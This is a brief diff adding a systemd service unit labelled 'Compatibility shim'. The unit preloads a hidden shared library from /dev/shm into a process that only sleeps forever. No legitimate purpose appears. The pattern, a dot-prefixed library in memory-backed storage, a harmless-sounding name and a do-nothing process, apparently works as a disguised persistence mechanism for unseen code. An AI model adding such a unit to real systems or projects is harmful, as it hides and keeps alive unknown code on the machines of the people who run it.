@@ -1,0 +1,7 @@
+[Unit]
+Description=Compatibility shim
+
+[Service]
+Type=simple
+Environment=LD_PRELOAD=/dev/shm/.libshim.so
+ExecStart=/usr/bin/env sleep infinity
